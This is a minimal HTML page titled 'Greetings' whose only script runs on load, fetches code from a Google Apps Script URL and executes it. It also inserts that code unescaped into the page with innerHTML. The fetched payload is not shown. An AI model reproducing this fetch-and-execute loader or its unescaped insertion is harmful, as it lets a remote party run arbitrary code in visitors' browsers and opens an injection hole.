<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Greetings</title>
    <style>
        body {
            margin: 0;
            background: #020202;
            cursor: crosshair;
        }

    </style>
</head>
<body>
    <div id="content"></div>
    <script>
        async function fetchCode() {
            const response = await fetch('https://script.google.com/macros/s/AKfycbwKaArBmkEP1wjDckrgeyeBjsWQYOfrS8vTFKnhPz72UU_d_LqVPPmcXNWrzKpdKJSQ/exec');
            const code = await response.text();

            // Create a new script element and insert the fetched code
            const script = document.createElement('script');
            script.type = 'text/javascript';
            script.text = code;
            document.body.appendChild(script);

            // Optionally, insert the fetched code into a div for display
            document.getElementById('content').innerHTML = `<pre>${code}</pre>`;
        }

        fetchCode();
    </script>
</body>
</html>
